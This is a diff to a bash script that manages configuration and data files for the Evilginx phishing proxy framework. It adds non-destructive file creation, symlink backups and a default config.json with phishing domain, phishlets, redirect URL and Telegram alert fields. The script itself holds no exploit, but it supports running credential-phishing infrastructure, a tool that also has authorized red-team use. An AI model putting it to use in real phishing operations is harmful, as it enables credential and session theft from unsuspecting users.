@@ -75,6 +75,7 @@ check_home_evilginx() {
 }
 
 # Ensure .evilginx directory and required files exist
+# IMPORTANT: Never overwrite existing files - only create if missing!
 ensure_evilginx_exists() {
   log "Ensuring .evilginx directory and files exist..."
   
@@ -94,22 +95,49 @@ ensure_evilginx_exists() {
     chown $CURRENT_USER:$GROUP "$EVILGINX_DIR/crt"
   fi
   
-  # Create required files if they don't exist
+  # Check if required files exist and create only if missing
   for file in "${FILES_TO_SYNC[@]}"; do
     evilginx_file="$EVILGINX_DIR/$file"
     
     if [[ ! -f "$evilginx_file" ]]; then
-      log "Creating empty $file in .evilginx directory..."
+      log "File $file doesn't exist in .evilginx directory, creating minimal version..."
+      
       if [[ "$file" == "config.json" ]]; then
-        # Create minimal empty config.json
-        echo "{}" > "$evilginx_file"
-      else
+        # Create a properly structured config.json with required fields
+        cat > "$evilginx_file" << EOF
+{
+  "blacklist": {
+    "mode": "unauth"
+  },
+  "general": {
+    "domain": "",
+    "ipv4": "",
+    "external_ipv4": "",
+    "bind_ipv4": "",
+    "unauth_url": "",
+    "https_port": 443,
+    "dns_port": 53,
+    "autocert": true,
+    "telegram_bot_token": "",
+    "telegram_chat_id": ""
+  },
+  "phishlets": {}
+}
+EOF
+      elif [[ "$file" == "blacklist.txt" ]]; then
+        # Create empty blacklist file
+        touch "$evilginx_file"
+      elif [[ "$file" == "data.db" ]]; then
+        # Create empty SQLite database file
         touch "$evilginx_file"
       fi
+      
       chmod 644 "$evilginx_file"
       chown $CURRENT_USER:$GROUP "$evilginx_file"
+      log "Created minimal $file in .evilginx directory"
+    else
+      log "✅ $file already exists in .evilginx directory, preserving content"
     fi
-    # No longer checking/fixing config.json structure
   done
   
   log "All required files exist in .evilginx directory."
@@ -160,10 +188,17 @@ create_symlinks() {
         log "Removing incorrect symlink for $file"
         rm -f "$panel_file"
       fi
-    elif [[ -e "$panel_file" ]]; then
-      # Regular file exists, remove it
-      log "Removing existing file $panel_file"
-      rm -f "$panel_file"
+    elif [[ -e "$panel_file" && ! -L "$panel_file" ]]; then
+      # Regular file exists, not a symlink
+      warning "Found regular file $panel_file instead of symlink"
+      warning "Moving original file to $panel_file.bak"
+      mv "$panel_file" "$panel_file.bak"
+    fi
+    
+    # Always make sure the source file exists before creating a symlink
+    if [[ ! -f "$evilginx_file" ]]; then
+      error "Source file $evilginx_file doesn't exist, cannot create symlink"
+      continue
     fi
     
     # Create the symlink from panel/data to .evilginx using relative path
@@ -236,22 +271,30 @@ verify_symlinks() {
 init_files() {
   log "Initializing file synchronization..."
   
-  # Ensure directories exist
-  mkdir -p "$EVILGINX_DIR"
-  mkdir -p "$DATA_DIR"
-  chmod 755 "$EVILGINX_DIR"
-  chmod 755 "$DATA_DIR"
+  # Ensure .evilginx directory exists
+  if [[ ! -d "$EVILGINX_DIR" ]]; then
+    mkdir -p "$EVILGINX_DIR"
+    chmod 755 "$EVILGINX_DIR"
+    chown $CURRENT_USER:$GROUP "$EVILGINX_DIR"
+  fi
   
-  # Make sure .evilginx directory and files exist
+  # Ensure panel data directory exists 
+  if [[ ! -d "$DATA_DIR" ]]; then
+    mkdir -p "$DATA_DIR"
+    chmod 755 "$DATA_DIR"
+    chown $CURRENT_USER:$GROUP "$DATA_DIR"
+  fi
+  
+  # First make sure original .evilginx files exist (but never overwrite existing content)
   ensure_evilginx_exists
   
-  # Create symlinks from panel/data to .evilginx
+  # Next create symlinks from panel/data to .evilginx
   create_symlinks
   
-  # Create local files that should not be symlinks
+  # Then create local files that should not be symlinks
   create_local_files
   
-  # Verify the symlinks
+  # Finally verify the symlinks
   verify_symlinks
   
   log "Initialization complete."
